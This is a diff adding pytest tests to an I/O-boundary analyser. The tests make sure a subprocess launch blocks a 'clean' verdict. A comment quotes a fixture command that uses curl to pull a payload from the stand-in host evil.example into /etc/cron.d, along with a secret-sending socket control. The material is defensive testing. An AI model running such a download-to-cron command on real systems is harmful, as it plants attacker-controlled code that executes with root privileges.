@@ -67,7 +67,11 @@ import pytest
 
 import hypergumbo_core.io_boundary as io_boundary
 import hypergumbo_core.verify_claims as verify_claims
-from hypergumbo_core.io_boundary import load_catalog
+from hypergumbo_core.io_boundary import (
+    CATALOG_BOUNDARY_TYPES,
+    OPAQUE_BOUNDARIES,
+    load_catalog,
+)
 from hypergumbo_core.verify_claims import compute_boundary_coverage
 
 
@@ -491,6 +495,156 @@ class TestEveryShippedCatalogueIsHeldToTheSameRule:
                 f"{language}: {module} carries a dated closed-world audit and "
                 f"still does not support a clean verdict"
             )
+
+
+#: Captured verbatim from ``hypergumbo survey`` over a 6-line fixture whose
+#: only statement is
+#: ``subprocess.run(["curl", "-o", "/etc/cron.d/pwned", "https://evil.example/p"])``.
+#: The ``call_construct: method`` is production's own spelling for an attribute
+#: call and is preserved rather than normalised — the gate reads it.
+SUBPROCESS_CURL_EDGES = [
+    {"src": "python:run.py:1-1:file:file",
+     "dst": "python:subprocess:0-0:subprocess:external_symbol", "type": "imports"},
+    {"src": "python:run.py:4-5:grab:function",
+     "dst": "python:subprocess:0-0:run:external_symbol", "type": "calls",
+     "meta": {"call_construct": "method"}},
+]
+
+#: THE DISCRIMINATOR. A call the catalogue classifies into a NON-opaque
+#: boundary, over a module that is NOT enumerated — so the only thing that can
+#: be permitting it is the classification itself. ``os`` carries no
+#: completeness record (``module_io_is_enumerated('os')`` is False), yet
+#: ``os.makedirs`` is a catalogued ``fs_write`` row.
+OS_MAKEDIRS_EDGES = [
+    {"src": "python:main.py:4-5:persist:function",
+     "dst": "python:os:0-0:makedirs:external_symbol", "type": "calls"},
+]
+
+
+class TestAnOpaqueCrossingIsNotAnExaminedNegative:
+    """INV-gahuz — classifying a call as ``subprocess`` records that the
+    analysis CANNOT SEE PAST it, and that must not be consumed as "I looked".
+
+    THE RESIDUAL ONE LEVEL BELOW INV-buzab. The two arms above were about a
+    module the catalogue had never enumerated. Here the call site IS matched,
+    by a real row, and the row is CORRECT: ``subprocess.run`` really is a
+    subprocess primitive. What is wrong is the INFERENCE from "a row matched"
+    to "this boundary was examined". For every other boundary that inference
+    holds, because a matched row implies a known and complete surface —
+    ``os.makedirs`` classified ``fs_write`` genuinely IS an examined negative
+    for a network claim. ``subprocess`` is the one boundary in
+    ``CATALOG_BOUNDARY_TYPES`` that asserts the opposite.
+
+    MEASURED ON THE SHIPPED CLI at dev ``4b2e745d3d``, both controls firing in
+    the same session:
+
+        fixture (python, 6 lines)                       claim            verdict  rc
+        ----------------------------------------------  ---------------  -------  --
+        subprocess.run(["curl","-o",FILE,URL])          fs_write absent  confirm   0
+        subprocess.run(["curl","-o",FILE,URL])          net_send absent  confirm   0
+        ---- controls ----
+        open("/etc/cron.d/pwned","w").write("x")        fs_write absent  violated  1
+        socket.connect(...); socket.send(secret)        net_send absent  violated  1
+
+    The program downloads a remote payload into a root cron directory and
+    confirms BOTH that it never writes to the filesystem AND that it never
+    sends over the network. Two false all-clears from one call.
+    """
+
+    def test_an_opaque_launch_cannot_support_a_clean_verdict(self) -> None:
+        coverage = _coverage(SUBPROCESS_CURL_EDGES)
+        assert coverage.complete is False, (
+            "a subprocess launch is exactly the case where the launched "
+            "program's I/O is absent from the edge set, so 'no chains found' "
+            "means 'none I could see' (INV-gahuz)"
+        )
+        assert "subprocess" in coverage.reason, (
+            f"the reason must NAME the opaque crossing so the gap is "
+            f"actionable; got: {coverage.reason!r}"
+        )
+
+    def test_the_reason_does_not_claim_the_call_was_unclassifiable(self) -> None:
+        """WORDING IS LOAD-BEARING HERE, and the obvious implementation gets it
+        wrong. Routing opaque crossings into the existing uncatalogued-module
+        list would print "the I/O catalog could not classify (subprocess)",
+        which is FALSE — it classified it exactly right. The blocker is
+        opacity, not a catalogue gap, and a reader who patches the wrong one
+        learns nothing. The same failure already shipped once as a doubled
+        clause, caught only by reading rendered output.
+        """
+        coverage = _coverage(SUBPROCESS_CURL_EDGES)
+        # NON-VACUITY: before the fix the reason is '' and every substring
+        # assertion below passes for the wrong reason.
+        assert coverage.reason, "a blocked verdict must state its cause"
+        assert "could not classify" not in coverage.reason, (
+            f"the catalogue DID classify subprocess.run; the reason must say "
+            f"the launch is opaque, not that the row is missing. Got: "
+            f"{coverage.reason!r}"
+        )
+
+    def test_a_classified_non_opaque_call_still_supports_confirmation(self) -> None:
+        """THE DISCRIMINATOR, and it is the whole precision argument.
+
+        Both this fixture and the one above are ``complete=True`` before the
+        fix, and both are single classified calls over a module carrying NO
+        enumeration record. A fix that merely stopped trusting
+        ``classify_call`` would turn BOTH False and this test is what catches
+        it — the distinction has to be the BOUNDARY, not the fact of matching.
+        """
+        assert load_catalog("python").module_io_is_enumerated("os") is False, (
+            "precondition: if os ever gains a completeness record this test "
+            "starts passing through the enumeration branch instead and stops "
+            "discriminating"
+        )
+        coverage = _coverage(OS_MAKEDIRS_EDGES)
+        assert coverage.complete is True, coverage.reason
+
+    def test_the_opaque_set_is_declarable_by_a_catalogue(self) -> None:
+        """A PREDICATE IS INERT UNTIL ITS CALL SITES CAN REACH IT.
+
+        ``_parse_catalog`` iterates exactly ``CATALOG_BOUNDARY_TYPES``, so a
+        boundary outside that tuple can never appear on a catalogued primitive
+        and listing it as opaque would be a gate nothing can trip —
+        ``command_launch`` and ``external_potential`` are exactly such names
+        (synthesised, never declared). This is the cheap structural check that
+        the set stays wired to something real.
+        """
+        assert OPAQUE_BOUNDARIES <= set(CATALOG_BOUNDARY_TYPES), (
+            f"opaque boundaries no catalogue can declare are inert: "
+            f"{sorted(OPAQUE_BOUNDARIES - set(CATALOG_BOUNDARY_TYPES))}"
+        )
+
+    @pytest.mark.parametrize("language", _shipped_languages())
+    def test_every_language_declaring_an_opaque_primitive_is_gated(
+        self, language: str,
+    ) -> None:
+        """PARITY OVER THE REGISTRY, because a fix verified on Python is not
+        verified for Go.
+
+        13 of the 14 shipped catalogues declare ``subprocess`` rows (erlang is
+        the exception, with none). Each one is a language whose repos can hand
+        control to an unseen program, and each must block a clean verdict on
+        its own edges — not on Python's. The next catalogue to add a subprocess
+        row is covered by this the day it lands.
+        """
+        catalog = load_catalog(language)
+        opaque_rows = [p for p in catalog.primitives
+                       if p.boundary in OPAQUE_BOUNDARIES]
+        if not opaque_rows:
+            pytest.skip(f"{language} declares no opaque primitive")
+        row = opaque_rows[0]
+        coverage = compute_boundary_coverage(
+            [{"src": f"{language}:app.src:1-5:handler:function",
+              "dst": f"{language}:{row.module}:0-0:{row.name}:external_symbol",
+              "type": "calls",
+              "meta": {"call_construct": row.kind}}],
+            {language},
+            {language: catalog},
+        )
+        assert coverage.complete is False, (
+            f"{language}: a call to the catalogued opaque primitive "
+            f"{row.module}.{row.name} still supports a clean verdict"
+        )
 
 
 def _permits(catalog, module: str) -> bool:
